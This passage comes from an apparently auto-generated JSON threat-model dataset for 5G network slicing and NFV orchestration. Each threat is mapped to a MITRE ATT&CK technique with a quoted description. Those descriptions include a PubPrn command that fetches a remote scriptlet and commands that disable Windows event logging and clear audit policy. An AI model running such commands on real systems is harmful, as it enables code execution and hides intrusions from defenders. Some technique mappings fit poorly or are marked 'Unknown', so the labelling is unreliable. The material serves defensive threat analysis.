                    "Role": "Security Monitoring",
                    "Condition": "Valid if automated defense mechanisms are absent."
                },
                {
                    "Assumption": "The attacker can sustain a resource exhaustion attack for a prolonged period.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker resources are ample."
                }
            ],
            "Potential Impact": "Service degradation, unresponsive management interfaces, and potential administrative function loss.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "orchestration",
                "management layer",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits privilege escalation vulnerabilities in network function services.",
            "Assumptions": [
                {
                    "Assumption": "Privilege escalation vulnerabilities exist within network function services.",
                    "Role": "Attacker",
                    "Condition": "Valid if vulnerabilities are present and unpatched."
                },
                {
                    "Assumption": "Access controls are insufficient to detect or prevent escalation.",
                    "Role": "System Administration",
                    "Condition": "Valid if access control measures are weak."
                },
                {
                    "Assumption": "Monitoring systems do not identify abnormal privilege use.",
                    "Role": "Security Monitoring",
                    "Condition": "Valid if anomaly detection is inadequate."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive functions, potential data manipulation, and administrative control loss.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "network function services",
                "vulnerability exploitation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker utilizes weak or default credentials to gain higher access levels.",
            "Assumptions": [
                {
                    "Assumption": "Weak or default credentials are utilized within the system.",
                    "Role": "System Administration",
                    "Condition": "Valid if weak/default credentials are present."
                },
                {
                    "Assumption": "Credential management practices are lax or not enforced.",
                    "Role": "System Administration",
                    "Condition": "Valid if credential policies are weak."
                },
                {
                    "Assumption": "Privileged access does not require multi-factor authentication.",
                    "Role": "Network Administration",
                    "Condition": "Valid if MFA is not implemented."
                }
            ],
            "Potential Impact": "Increased unauthorized access, potential data breaches, and system integrity issues.",
            "MITRE ATT&CK Keywords": [
                "weak credentials",
                "default passwords",
                "privilege escalation",
                "multi-factor authentication"
            ],
            "mitre_technique": {
                "name": "Default Accounts",
                "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)",
                "id": "attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d",
                "technique_id": "T1078.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits software bugs in VNFs to execute commands with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Software bugs about command execution vulnerabilities exist in VNFs.",
                    "Role": "Attacker",
                    "Condition": "Valid if vulnerabilities are known or identified."
                },
                {
                    "Assumption": "Security patches or updates for these bugs are not yet applied.",
                    "Role": "System Administration",
                    "Condition": "Valid if patches are delayed."
                },
                {
                    "Assumption": "There are no runtime security measures to restrict command execution.",
                    "Role": "Network Administration",
                    "Condition": "Valid if security measures are weak or absent."
                }
            ],
            "Potential Impact": "Execution of unauthorized commands, data manipulation, and potential full system control.",
            "MITRE ATT&CK Keywords": [
                "software bugs",
                "command execution",
                "elevated privileges",
                "VNFs"
            ],
            "mitre_technique": {
                "name": "Process Injection",
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
                "technique_id": "T1055"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "12",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate Network Function (NF) to intercept and manipulate communication between network slices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network infrastructure",
                    "Role": "Attacker",
                    "Condition": "Attacker gains physical or logical access"
                },
                {
                    "Assumption": "The network slices use weak or no mutual authentication",
                    "Role": "Network Configuration",
                    "Condition": "Misconfigured or lack of authentication mechanisms"
                },
                {
                    "Assumption": "The attacker has knowledge of the NF architecture",
                    "Role": "Attacker",
                    "Condition": "Obtain architectural details through espionage or insider threat"
                }
            ],
            "Potential Impact": "Compromise of data confidentiality and integrity within the network slices.",
            "MITRE ATT&CK Keywords": [
                "network",
                "spoofing",
                "communication",
                "device",
                "virtualized environment"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a legitimate user to gain unauthorized access to sensitive data on the network slices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to user credentials",
                    "Role": "Attacker",
                    "Condition": "Credential theft or phishing"
                },
                {
                    "Assumption": "Authentication mechanisms are insufficient",
                    "Role": "Authentication System",
                    "Condition": "Weak or compromised authentication controls"
                },
                {
                    "Assumption": "The attacker can communicate over the internet-facing interfaces",
                    "Role": "Attacker",
                    "Condition": "Use of external interfaces by attacker"
                }
            ],
            "Potential Impact": "Disclosure of sensitive user and operational data.",
            "MITRE ATT&CK Keywords": [
                "credential theft",
                "spoofing",
                "internet",
                "user",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as the Network Functions Virtualization Orchestrator (NFVO) to alter the deployment and management of network slices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has administrative credentials for the NFVO",
                    "Role": "Attacker",
                    "Condition": "Credential compromise through insider threat or exploit"
                },
                {
                    "Assumption": "Insufficient monitoring and logging of NFVO actions",
                    "Role": "Network Monitoring",
                    "Condition": "Lack of effective auditing and alerts"
                },
                {
                    "Assumption": "The NFVO controls are not secure",
                    "Role": "Network Configuration",
                    "Condition": "Weak or misconfigured NFVO security measures"
                }
            ],
            "Potential Impact": "Disruption and potential takeover of network slice management operations.",
            "MITRE ATT&CK Keywords": [
                "orchestration",
                "spoofing",
                "control",
                "network",
                "virtualized environment"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies Virtual Network Functions (VNFs) code to inject malicious operations.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has write access to the VNF codebase",
                    "Role": "Attacker",
                    "Condition": "Insider threats or exploited vulnerabilities"
                },
                {
                    "Assumption": "Inadequate code review processes",
                    "Role": "Development Team",
                    "Condition": "Lack of stringent code audits"
                },
                {
                    "Assumption": "Deployment of unverified VNFs",
                    "Role": "Deployment Process",
                    "Condition": "Failure to verify integrity of VNFs before deployment"
                }
            ],
            "Potential Impact": "Integrity compromise leading to unauthorized operations within network slices.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code injection",
                "virtualized environment",
                "network",
                "execution"
            ],
            "mitre_technique": {
                "name": "PubPrn",
                "description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",
                "id": "attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58",
                "technique_id": "T1216.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters data passing through external interfaces to compromise the integrity of network slice data.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces are exposed and not properly secured",
                    "Role": "Network Configuration",
                    "Condition": "Weak security controls on external communications"
                },
                {
                    "Assumption": "Data is not encrypted during transmission",
                    "Role": "Data Handling",
                    "Condition": "Lack of encryption protocols for data in transit"
                },
                {
                    "Assumption": "The attacker can monitor and alter transmissions",
                    "Role": "Attacker",
                    "Condition": "Use of man-in-the-middle techniques"
                }
            ],
            "Potential Impact": "Integrity compromise of sensitive information exchanged over the network.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data",
                "network",
                "man-in-the-middle",
                "transmission"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker triggers a vulnerability in the NFVO to modify the configuration of network slices, diverting traffic to malicious infrastructures.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities within the NFVO remain unpatched",
                    "Role": "System Administrator",
                    "Condition": "Delay or failure in applying security updates"
                },
                {
                    "Assumption": "No real-time monitoring of NFVO status",
                    "Role": "Security Monitoring",
                    "Condition": "Absence of continuous monitoring solutions"
                },
                {
                    "Assumption": "The attacker succeeds in exploiting the NFVO",
                    "Role": "Attacker",
                    "Condition": "Discovery and exploitation of vulnerabilities"
                }
            ],
            "Potential Impact": "Diverted traffic leading to data interception and loss of integrity.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network configuration",
                "orchestration",
                "vulnerability",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies initiating a malicious action on network functions, and logging mechanisms are insufficient to prove otherwise.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are not tamper-proof",
                    "Role": "Network Configuration",
                    "Condition": "Logs can be altered or deleted"
                },
                {
                    "Assumption": "Inadequate auditing of user actions",
                    "Role": "Security Monitoring",
                    "Condition": "Poor or nonexistent audit trails"
                },
                {
                    "Assumption": "The user has sufficient access to perform actions without detection",
                    "Role": "User",
                    "Condition": "High-level access privileges without appropriate controls"
                }
            ],
            "Potential Impact": "Lack of accountability for malicious activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit",
                "user actions",
                "network"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00344004-60c3-4b78-b4d7-7f54eea7a914",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An administrative user performs unauthorized configurations to network slices and claims ignorance, challenging traceability.",
            "Assumptions": [
                {
                    "Assumption": "Logging does not capture all critical changes",
                    "Role": "Configuration Management",
                    "Condition": "Incomplete or selective logging"
                },
                {
                    "Assumption": "Insufficient authentication and authorization controls",
                    "Role": "Security Controls",
                    "Condition": "Weak or absent authentication mechanisms"
                },
                {
                    "Assumption": "The user can plausibly deny actions due to weak evidence",
                    "Role": "User",
                    "Condition": "Ambiguity in log data or lack of forensic capabilities"
                }
            ],
            "Potential Impact": "Difficulty in tracing and rectifying unauthorized configurations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration change",
                "administration",
                "logging",
                "network slices"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious insider erases logs to cover illicit activities within the network functions.",
            "Assumptions": [
                {
                    "Assumption": "Log retention policies are weak or nonexistent",
                    "Role": "Policy Enforcement",
                    "Condition": "Lack of robust retention policies"
                },
                {
                    "Assumption": "No backup or replication of log data",
                    "Role": "Data Management",
                    "Condition": "Failure to implement backup systems"
                },
                {
                    "Assumption": "The insider has adequate knowledge and access",
                    "Role": "Insider",
                    "Condition": "Knowledge of and access to the logging mechanisms"
                }
            ],
            "Potential Impact": "Loss of forensic evidence, leading to challenges in identifying and stopping malicious activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log deletion",
                "insider threat",
                "network functions",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits vulnerabilities in external interfaces to access and extract sensitive data from network slices.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces are not properly secured",
                    "Role": "Network Configuration",
                    "Condition": "Insufficient security controls on interfaces"
                },
                {
                    "Assumption": "Data in network slices is not encrypted or poorly encrypted",
                    "Role": "Data Security",
                    "Condition": "Weak encryption practices"
                },
                {
                    "Assumption": "The attacker can perform reconnaissance to identify vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Ability to scan and analyze external interfaces"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data extraction",
                "vulnerability",
                "network",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts communications between VNFs to access unencrypted sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted",
                    "Role": "Data Handling",
                    "Condition": "Lack of encryption of transmitted data"
                },
                {
                    "Assumption": "Insufficient network segmentation",
                    "Role": "Network Design",
                    "Condition": "Weak segmentation between different functions"
                },
                {
                    "Assumption": "Attacker has the capability to intercept communications",
                    "Role": "Attacker",
                    "Condition": "Use of network monitoring tools or techniques"
                }
            ],
            "Potential Impact": "Disclosure of sensitive information and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "network functions",
                "communication",
                "unencrypted data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
